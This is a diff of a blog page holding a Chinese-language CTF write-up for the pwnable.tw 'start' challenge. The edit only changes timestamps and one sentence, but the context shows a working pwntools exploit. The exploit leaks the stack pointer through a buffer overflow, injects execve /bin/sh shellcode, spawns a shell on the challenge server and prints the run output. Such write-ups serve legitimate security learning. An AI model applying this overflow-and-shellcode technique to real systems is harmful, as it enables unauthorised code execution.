@@ -30,7 +30,7 @@
 <meta property="og:image" content="https://kazma.tw/images/start_exe.png">
 <meta property="og:image" content="https://kazma.tw/images/start_disas.png">
 <meta property="article:published_time" content="2024-02-06T17:46:25.000Z">
-<meta property="article:modified_time" content="2024-02-07T06:56:17.965Z">
+<meta property="article:modified_time" content="2024-02-07T06:58:40.309Z">
 <meta property="article:author" content="kazma">
 <meta property="article:tag" content="writeup">
 <meta property="article:tag" content="pwn">
@@ -414,8 +414,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-02-07 14:56:17</span>
-            <span class="mobile">2024-02-07 14:56:17</span>
+            <span class="desktop">2024-02-07 14:58:40</span>
+            <span class="mobile">2024-02-07 14:58:40</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -657,7 +657,7 @@
 <td align="center"></td>
 </tr>
 </tbody></table>
-<p>我們 leak 出來的位址是 x，x+20 是 shellcode 的起始位置，所以在 ret 的地方以就是 x+16 的位址填上 x+20。</p>
+<p>我們 leak 出來的位址是 x，x+20 是 shellcode 的起始位置，所以我們在 ret ，也就是 x+16 的位址填上 x+20。</p>
 <h2 id="0x4-Exploit"><a href="#0x4-Exploit" class="headerlink" title="0x4 Exploit"></a>0x4 Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category = BytesWarning)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10000</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./start&#x27;)</span></span><br><span class="line">write = <span class="number">0x08048087</span></span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x14</span> + p32(write)</span><br><span class="line">r.sendafter(<span class="string">b&#x27;:&#x27;</span>, p1)</span><br><span class="line">old_esp = u32(r.recv(<span class="number">4</span>))</span><br><span class="line">r.recv()</span><br><span class="line">success(<span class="string">&#x27;Old_esp = %s&#x27;</span> % <span class="built_in">hex</span>(old_esp))</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">push eax</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx, esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">mov al, 0xb</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p2 = <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x14</span> + p32(old_esp + <span class="number">0x14</span>) + asm(shellcode)</span><br><span class="line">r.send(p2)</span><br><span class="line">r.sendline(<span class="string">&#x27;cat /home/`whoami`/flag&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
 <p>Result:</p>
 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─$ python exploit.py</span><br><span class="line">[+] Opening connection to chall.pwnable.tw on port 10000: Done</span><br><span class="line">[+] Old_esp = 0xffaf0770</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">FLAG&#123;??????????????????&#125;</span><br></pre></td></tr></table></figure></div>
@@ -678,7 +678,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-02-07 14:56:17
+                    :</strong> 2024-02-07 14:58:40
             </li>
         
         <li>
